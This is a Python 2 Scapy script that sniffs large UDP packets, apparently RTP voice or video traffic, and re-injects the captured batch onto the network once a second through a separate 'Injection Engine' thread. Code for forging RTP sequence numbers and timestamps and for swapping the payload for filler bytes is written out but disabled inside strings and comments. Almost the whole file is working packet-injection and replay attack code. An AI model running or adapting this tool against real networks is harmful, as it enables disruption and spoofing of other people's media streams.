import sys
from scapy.all import *
import threading
import copy
from timeit import default_timer as timer
import time

def listener():
	# Global variables to be used
	global passedPacket, packetSem, termSem, terminate, filler
	
	printLine = "===================="
	print printLine
	print "Beginning Capture Engine"
	print printLine

	storeList = True

	packetSrc = ""

	start = timer()*1000
	while True:
		if (timer()*1000) >= start:
			while True:
				packetSem.acquire()
				packetList = sniff(filter="udp and len>1355", count=200, timeout=1)
				if not packetList:
					termSem.acquire()
					terminate = True
					termSem.release()
					packetSem.release()
					return
				packet = packetList[0]
				if packet[UDP].len == 1336:
					break

			packetSrc = packet[IP].src
			"""

			print "RTP packet captured"
			
			#TODO: Build RTP Layer
			rtpLayer = RTP()/Raw()
			raw = packet[Raw].load

			currByte = ord(raw[0])

			ver = currByte >> 6
			rtpLayer.version = ver

			pad = currByte >> 5
			pad = pad&1
			rtpLayer.padding = pad

			ext = currByte >> 4
			ext = ext&1
			rptLayer = ext

			cc = currByte&15
			rtpLayer.numsync = cc

			currByte = ord(raw[1])

			mark = currByte >> 7
			rtpLayer.marker = mark

			payloadType = currByte&127
			rtpLayer.payload_type = payloadType

			hiByte = ord(raw[2])
			loByte = ord(raw[3])

			hiByte = hiByte << 8
			seq = hiByte + loByte
			rtpLayer.sequence = seq

			hiByte1 = ord(raw[4])
			hiByte2 = ord(raw[5])
			loByte1 = ord(raw[6])
			loByte2 = ord(raw[7])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			time = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.timestamp = time

			hiByte1 = ord(raw[8])
			hiByte2 = ord(raw[9])
			loByte1 = ord(raw[10])
			loByte2 = ord(raw[11])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			ssrc = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.sourcesync = ssrc

			hiByte1 = ord(raw[12])
			hiByte2 = ord(raw[13])
			loByte1 = ord(raw[14])
			loByte2 = ord(raw[15])

			hiByte1 = hiByte1 << 24
			hiByte2 = hiByte2 << 16
			loByte1 = loByte1 << 8
			sync = hiByte1 + hiByte2 + loByte1 + loByte2
			rtpLayer.sync = sync

			#TODO: Rebuild packet with RTP layer

			newRaw = filler

			rtpLayer[Raw].load = newRaw

			packet[Raw] = rtpLayer
			"""
			#Send packet to injector
			if(storeList):
				passedPacket = packetList
				
				packetSem.release()

				print "Sending captured RTP packet to injector"
				
				storeList = False
				
				start = (timer()*1000) + 500
			else:
				packetSem.release()

			packetList = list()
	return


# takes in a packet from the main thread and modifies its seq num and timestamp
def modifyPacketHeader(packet, new_seq, new_ts):
	packet.sequence = new_seq
	packet.timestamp = new_ts

	
# replaces a packet's payload	
def modifyPacketPayload(packet, new_payload):
	packet[Raw].load = new_payload
	

# Deletes the checksums from each layer so Scapy can recalculate the checksums
def deleteChecksums(packet):
	del packet[IP].chksum
	del packet[UDP].chksum
	
	
def injector():
	# global variables to be used
	global packetSem, terminate, passedPacket, filler
		
	printLine = "===================="
	print printLine
	print "Beginning Injection Engine"
	print printLine
	
	while not terminate:		
		# make sure packet has UDP layer
		# if it does, copy it locally, overwrite the global to be just a tcp layer, and release the semaphore
		if(passedPacket):
			# Attempt to acquire packet
			#packetSem.acquire()
			#packet = copy.deepcopy(passedPacket)
			#passedPacket = list()
			#passedPacket.append(TCP())
			#packetSem.release()
			
			# List of fake packets to send in a burst
			#fake_packets = []
			
			# modify the packet payload
			#modifyPacketPayload(packet, filler)
			#modifyPacketHeader(packet, packet.sequence + 163, packet.timestamp + 19647)
			#fake_packets.append(packet)
			
			# send round of test packets every 20 ms for 500 ms. Roughly 25 packets
			# update sequence number and timestamp accordingly
			print "Beginning sending burst of 25 packets"
			"""
			for i in range(24):
				modifyPacketHeader(packet, packet.sequence + 1, packet.timestamp + 309)
				fake_packet = copy.deepcopy(packet)
				deleteChecksums(fake_packet)
				fake_packets.append(fake_packet)
				print "Sending packet %d" % i
			"""
			sendp(passedPacket)
			time.sleep(1)
	return

	
# Filler data to replace the packet's payload (20 bytes)
filler = ""
for i in range(1298):
	filler += "A"
	
packetSem = threading.BoundedSemaphore(value = 1)
termSem = threading.BoundedSemaphore(value = 1)

passedPacket = list()
terminate = False

listener = threading.Thread(target = listener)
injector = threading.Thread(target = injector)

listener.start()
injector.start()

listener.join()
injector.join()